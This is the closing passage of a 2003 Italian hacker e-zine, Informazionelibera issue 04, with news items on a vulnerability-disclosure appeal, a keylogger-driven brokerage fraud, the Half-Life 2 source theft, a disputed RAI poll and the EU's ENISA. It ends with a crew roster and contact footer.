email  a  tutti i clienti della Tornado Development, il provider di  servizi  di
posta  presso  cui  era impiegato, che il sistema di posta  della  societa'  era
viziato  da  un  baco  e  che  tale vulnerabilita' poteva  comportare  l'accesso
indesiderato di terzi al server di posta, e di conseguenza alle email  di  tutti
gli utenti.
Secondo quanto espose con successo il pubblico accusatore del primo processo, le
oltre  5600 email inviate avevano costituito un indubbio danno per la  societa',
che da allora ha comunque chiuso i battenti.

Spiegando ai clienti come agisce la vulnerabilita', e perche' la loro posta  era
conseguentemente  a  rischio, la pubblica accusa allora  affermava  che  McDanel
avrebbe  diminuito la sicurezza dei sistemi, imputandogli quindi  la  violazione
della Computer Fraud and Abuse Act.
L'appello  che  e'  stato discusso in questi giorni ha portato alla  convinzione
prevalente  che  la  causa non si sarebbe dovuta nemmeno  discutere,  in  quanto
l'intento  dell’accusato  non  era  quello  di  danneggiare  l'azienda  per  cui
lavorava,  in base a quanto stabilito dalla legge nel Computer Fraud  and  Abuse
Act.

Anche il fatto che tale comunicazione sia stata fatta dopo oltre un anno dal suo
allontanamento  e che per far cio' egli abbia usato un vecchio  account  rimasto
attivo  presso  il  server  mail presso i suoi ex datori  di  lavoro,  e'  stato
considerato aspetto secondario rispetto alla mancanza di volonta' della  Tornado
Development  nel non voler porre rimedio alla lacuna denotata,  che  non  poteva
esser  considerata un dettaglio confidenziale proprio perche' era stata denotata
pubblicamente da molti esperti.
Quando  aveva  inviato  le  email, inoltre, e' vero che  McDanel  non  era  piu'
dipendente della Tornado, ma era ancora autorizzato ad inviare email  tramite  i
sistemi  di  Tornado grazie a una clausola che al momento dell'interruzione  del
rapporto lo autorizzava a mantenere il suo account.

La  pubblica  accusa  federale ha affermato quindi  che  il  giudice  aveva  mal
interpretato  la legge in primo grado, ed ha quindi dato vita a questo  un  raro
caso  di  "ammissione  di errore". La semplice rivelazione  di  un  problema  di
vulnerabilita', quindi, di per se' non costituisce danno ne' reato.

--------------------------------------------------------------------------------
Studente sotto accusa per l'intrusione in un account di gestione azionaria
--------------------------------------------------------------------------------
Van T. Dinh, diciannovenne studente di economia alla Drexel University, e' stato
arrestato con l'accusa di aver violato l'account di un utente di una societa' di
brokeraggio  e  di  averlo utilizzato per investimenti  fallimentari  che  hanno
causato all'ignaro investitore perdite per circa 40 mila dollari.

Dalle  informazioni  raccolte, risulterebbe che  lo  studente  sia  riuscito  ad
ottenere  la password utilizzando un programma di key logging, che ha registrato
la  sequenza  dei  tasti digitata dalla vittima mentre questi  eseguiva  le  sue
operazioni online.

Secondo  quanto  dichiarato  dal procuratore federale  incaricato  e  dalla  SEC
(l'organo  di  controllo della borsa americana) lo stratagemma  impiegato  dallo
studente   per  circuire  le  proprie  potenziali  vittime  e'  stato  piuttosto
originale: dopo aver creato un sito da cui i visitatori potevano controllare  le
quotazioni  di diversi mercati borsistici, ha invitato gli utenti a  partecipare
al  beta  test di un software per l'analisi tecnica dei titoli di borsa.  Questo
software era in realta' soltanto un pretesto, e conteneva un programma, noto con
il  nome  "the  Beast", che memorizza tutti i tasti battuti dall'utente  che  lo
istalla per poi reindirizzarli via internet a un idirizzo prestabilito.

L'indagine  era  scattata lo scorso luglio a seguito di una  segnalazione  fatta
dalla  vittima.  Seguendo  a ritroso diverse tracce, comprese  le  registrazioni
delle  transazioni finanziarie, i dati bancari ed i relativi indirizzi  Internet
utilizzati  dai  protocolli,  si  e' arrivati  a  Dinh  che,  nonostante  avesse
intrapreso  numerose  iniziative  per  coprire  la  propria  identita'   facendo
"rimbalzare"  le  informazioni attraverso i cinque  continenti,  aveva  comunque
lasciato diverse prove delle proprie azioni.

Sul giovane ora gravano accuse che vanno dalla frode connessa alla sicurezza,  a
frode  condotta  attraverso la posta e frode telematica, a danni  procurati  per
accesso  non  autorizzato a computer, e rischia una  pena  fino  a  20  anni  di
reclusione  per la frode e di 10 anni per i reati connessi all'uso  illecito  di
strumenti informatici.
Dal 1995, i casi di frode informatica trattati da uno speciale ufficio della SEC
sono 425, la maggior parte riconducibili ad azioni di insider trading o di falsa
vendita di azioni.

--------------------------------------------------------------------------------
Rubati i sorgenti della nuova versione di Half Life
--------------------------------------------------------------------------------
Alla  fine  della scorsa settimana, alcuni sconosciuti sono riusciti a penetrare
uno  dei  server  della societa' produttrice di videogame  Valve  Software  e  a
prelevare parte dei sorgenti di Half Life 2.

Half  Life e' certamente uno dei giochi per PC di maggior diffusione e  successo
tra  quelli sviluppati negli ultimi anni. La versione 2 del gioco e' in fase  di
avanzato  sviluppo  ed il suo rilascio, previsto per fine anno,  ha  creato  una
notevole  attesa tra i numerosi appassionati, come non accadeva da  tempo  nella
comunita' dei giocatori informatici.

Quanto  sottratto  non  dara' modo di disporre di una versione  funzionante  del
gioco,  ma  contiene  gran  parte dei programmi  chiave  del  gioco  e  potrebbe
permettere a terzi di sviluppare a loro volta delle versioni del gioco  con  una
grafica diversa.
"Una  volta  che si dispone dell'engine" ha affermato Michael Pachter,  analista
della  Wedbush Morgan, si possono modificare i personaggi e farli interagire  in
ambienti  diversi, passando ad esempio da una guerra spaziale ad una guerra  nel
deserto.

Secondo  quanto  diffuso da Gabe Newell, fondatore di Valve  Software,  qualcuno
deve essere riuscito ad accedere al suo account e-mail e da qui ad installare un
key-logger presso svariati computer aziendali, ma solo a meta' settembre si sono
iniziate  a  scoprire le tracce che hanno evidenziato come fosse stata  eseguita
una copia dei sorgenti.

La  comunita' dei player online e' gia' in fibrillazione: la possibilita' che un
clone   del  celebre  gioco  possa  trovare  sbocchi  commerciali  e'  piuttosto
improbabile,  ma  un reverse engineering potrebbe permettere ai  giocatori  piu'
smaliziati  di sfruttare particolari conoscenze per battere piu' facilmente  gli
avversari nelle battaglie online che permette la versione multiplayer del gioco,
e questo potrebbe ridurre l'appeal del videogame e quindi il suo successo.

--------------------------------------------------------------------------------
Un sondaggio dice basta a Berlusconi, e alla RAI qualcuno parla di hacker
--------------------------------------------------------------------------------
Gli  italiani  dicono basta a Berlusconi, almeno secondo un  sondaggio  lanciato
dalla trasmissione RAI Domenica IN, condotta da quest'anno da Paolo Bonolis.
Sembra  che  in  poche  ore  sia arrivato un numero considerevole  di  e-mail  e
telefonate (2525 nel solo pomeriggio di ieri, certificate da un service Telecom)
contro  il  premier  italiano,  che  gli  autori  hanno  sintetizzato  (o  forse
parzialmente  mitigato) nella risposta "Basta a Berlusconi  e  ai  politici  che
dicono e non fanno".

Negli  ambienti  Rai  scoppia il giallo: c'e' chi grida alla congiura  politica,
c'e'  chi suggerisce l'intervento degli hacker, che sembrano diventato ormai  il
capro espiatorio di tutto cio' che succede nel mondo.
Dall'ufficio  stampa della RAI assicurano che fino a venerdi' (il sondaggio  era
stato lanciato gia' da tre settimane) non c'erano nomi di politici nella top  5.
E  allora come si spiega che in poco meno di due giorni Berlusconi abbia scalato
con  prepotenza la classifica, se non con un intervento da parte  di  un  pirata
informatico?
"Se  gli hacker sono entrati al Pentagono..." e' il commento del direttore della
comunicazione Guido Paglia.
Anche  il  consigliere di amministrazione della RAI Marcello Veneziani  pensa  a
un'intrusione, ma piu' che un intervento dall'esterno insinua la possibilita' di
una  manomissione dei dati compiuta per via informatica, ma da elementi  interni
alla RAI.

Per  la  cronaca, al secondo posto nei risultati del famigerato sondaggio figura
"la distruzione del pianeta", al terzo la "malasanita'", al quarto la coppia Bin
Laden-Saddam Hussein, al quinto "quelli per cui conta solo il danaro", al  sesto
"l'aumento  delle tasse", al settimo "letterine e calciatori in tv",  all'ottavo
"le  angherie  del capoufficio", al nono "l'aumento dei prezzi", al  decimo  "la
pubblicita' durante i film in tv".
Da  oggi  si  vota anche via Web sul sito RAI (pare che stamane  la  pagina  del
sondaggio  fosse addirittura bloccata dal troppo traffico), per cui è  probabile
che  nei  prossimi giorni si riparli di attacchi hacker, se i risultati  saranno
altrettanto clamorosi.

--------------------------------------------------------------------------------
La Commissione Europea studia un organismo per la sicurezza informatica
--------------------------------------------------------------------------------
Tra  un  mese  un comitato di esperti si riunira' per discutere in  merito  alla
struttura  e  alla  composizione  dell'ENISA  (European  Network  &  Information
Security Agency), un organismo della Commissione Europea dedicato alla sicurezza
informatica.

Il  comitato di studio sara' composto da rappresentanti di aziende fornitrici di
tecnologia,  da esponenti del mondo politico e industriale che si  incontreranno
il  4 novembre prossimo presso il RAI Exhibition & Congress Centre di Amsterdam,
in occasione della RSA Conference.

Tra  coloro  che  prenderanno  parte  al comitato:  Danny  de  Temmerman,  della
Commissione Europea; Richard Clarke, ex consulente dell'amministrazione  Clinton
e  Bush;  Stefan  Engel-Flechsig, CEO di Radicchio; Wim van Velzen,  Membro  del
Parlamento Europeo, John Madelin, Director of Business Development EMEA  di  RSA
Security;  Michael Bartholomew, Direttore di ETNO, l' Associazione di  Operatori
di Rete delle Telecomunicazioni in Europa.

Alla  RSA Conference interverranno noti esponenti internazionali dell'industria,
del  mondo  accademico  e  del  settore pubblico  che,  in  oltre  70  sessioni,
tratteranno i temi piu' attuali nel campo della sicurezza informatica.
Si  terranno seminari sul crimine informatico, sulla gestione delle patch per la
sicurezza nei sistemi Microsoft, sulla sicurezza delle LAN Wireless.




+-[END INFORMAZIONELIBERA E-ZINE 04]-------------------------------------------+



                        [...Ci rivediamo tra un mese per il prossimo numero ...] 
                        [www.informazionelibera.cjb.net ~ cyberdudeIL@libero.it]


+-[INFORMAZIONI SULLA E-ZINE]--------------------------------------------------+
|------------------------------------------------------------------------------|
|-[I MEMBRI CHE HANNO PARTECIPATO A QUESTO NUMERO]-----------------------------|
|  04x01 - Cyberdude      - Napoli  - [cyberdudeIL@libero.it      ]            |
|  04x02 - Bigalex        - Napoli  - [b1galez@hotmail.com        ]            |
|  04x03 - Tailot         - Trapani - [webmaster@tailot.zzn.com   ]            |
|  04x04 - Lord Jex       - Bari    - [lord_Jex@yahoo.it          ]            |
|  04x05 - Unrelated      - Napoli  - [unrelated@libero.it        ]            |
|  04x06 - ^ZaSt^         - Vicenza - [baloo84@inwind.it          ]            |
|  04x07 - Graftal        - Torino  - [Macro_Six3@hotmail.com     ]            |
|  04x08 - Blacksword     - Napoli  - [blacksword1@libero.it      ]            |
|  04x09 - SysOv3rrid3    - Lecce   - [SysOverride@libero.it      ]            |
|  04x10 - Evil           - Genova  - [webmaster@eviltime.com     ]            |
|  04x11 - Eimiar         - Torino  - [pastoreantonietta@libero.it]            |
|  04x12 - Nemesis        -         - [nemesis@blangels.it        ]            |
|  04x13 - Branton        -         - [uiha@uiha.tk               ]            |
|  04x14 - Marsio         - Venezia - [sergy51@inwind.it          ]            |
|  04x15 - Luke SkyWalker - Bari    - [emanuelepal@libero.it      ]            |
|------------------------------------------------------------------------------|
|-[I NUMERI PRECEDENTI]--------------------------------------------------------|
| INFORMAZIONELIBERA 00 <----- 30 articoli ---------------> 06 Maggio 2003     |    
| INFORMAZIONELIBERA 01 <----- 29 articoli ---------------> 06 Giugno 2003     |                                   
| INFORMAZIONELIBERA 02 <----- 35 articoli ---------------> 27 Giugno 2003     |
| INFORMAZIONELIBERA 03 <----- 30 articoli ---------------> 15 Settembre 2003  |
|------------------------------------------------------------------------------|
|-[DOVE CI TROVATE]------------------------------------------------------------|
| Irc Server : Net36.azzurranet.org - irc.azzurranet.org                       |
| Porta      : 6667                                                            |
| Chan       : #Informazionelibera                                             |
| Web site   : http://www.informazionelibera.cjb.net                           |
| Mailto     : cyberdudeIL@libero.it ~ cyberdudemail@libero.it                 |
|------------------------------------------------------------------------------|
|-[SIAMO SEGNALATI SUI SEGUENTI SITI]------------------------------------------|
| Hack Italia    -  http://www.hack-italia.org/                                |
| Kuht           -  http://www.kuht.it                                         |
| Zona Autonoma  -  http://www.zonautonoma.cjb.net/                            |
+------------------------------------------------------------------------------+
+-[COMUNICAZIONE AI LETTORI]---------------------------------------------------+
| Stiamo cercando esperti in tutti i settori underground disposti a dare  una  |
| mano alla crew a battersi per  la propria causa : diffondere l'informazione  |
| libera!!! Chi è interessato a  collaborare  può  inviare  i  suoi  articoli  |
| all'indirizzo  e-mail  cyberdudeIL@libero.it  ...  tali  articoli  verranno  |
| esaminati e se ritenuti idonei inseriti nella  e-zine  il  prossimo  numero  |
| Grazie di tutto a tutti                                                      |
| Cyberdude & Informazionelibera crew                                          |
+------------------------------------------------------------------------------+

++==================[Copyright Informazionelibera Crew 2003]=================++

++==================[ http://www.informazionelibera.cjb.net ]================++
++============================[In continuo progresso]========================++
...


